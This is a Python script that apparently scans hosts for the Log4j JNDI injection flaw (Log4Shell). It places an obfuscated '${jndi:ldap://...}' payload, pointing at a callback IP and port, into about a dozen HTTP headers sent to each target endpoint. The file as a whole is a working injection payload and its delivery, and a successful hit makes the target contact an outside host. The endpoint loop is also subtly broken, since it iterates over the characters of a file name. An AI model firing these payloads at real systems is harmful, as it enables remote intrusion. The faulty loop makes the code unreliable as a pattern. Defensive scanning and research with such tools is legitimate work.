import requests
import argparse
import logging

def main():
  
  parser = argparse.ArgumentParser(description='')
  parser.add_argument('-t', '--target', dest='target',help='remote target IP or host name to check for vulns against')
  parser.add_argument('-ri', '--remoteip', dest='remote_ip',help='remote system IP to get the requests back for successful exploitation')
  parser.add_argument('-rp', '--remoteport', dest='remote_port', type=int, help='remote system port to get the requests back for successful exploitation')
  parser.add_argument('-l', '--endpointlist', dest='endpoint_list',help='List of the potential endpoints that exist at the target')
  parser.add_argument('-o', '--output', dest='output_file',help='File to write logging out to')

  args = parser.parse_args()

  # Configure the logging
  logging.basicConfig(filename=args.output_file, level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')

  url = args.target

  for endpoint in args.endpoint_list:
    logging.info(f'Hitting {url}{endpoint}')
    try:
      malicious_command = "${${lower:J}n${lower:d}i:ld${lower:A}p://" + args.remote_ip + ":" + str(args.remote_port) + "/scannerTesting-" + url + endpoint
      headers = {
        'User-Agent': malicious_command,
        'Forwarded': malicious_command,
        'Referer': malicious_command,
        'X-Client-IP': malicious_command, 
        'X-Correlation-ID': malicious_command, 
        'X-Csrf-Token': malicious_command,
        'X-Forwarded-By': malicious_command,
        'X-Forwarded-For-IP': malicious_command,
        'X-Originating-IP': malicious_command,
        'X-Remote-Addr': malicious_command,
        'X-Remote-IP': malicious_command,
        'X-Request-ID': malicious_command,
        'X-Requested-With': malicious_command, 
        'X-True-IP': malicious_command
      }
      r = requests.get(url + endpoint, headers=headers)
    except Exception as e:
      logging.error(f'Some Exception Occured: {e}')

if __name__ == '__main__':
  main()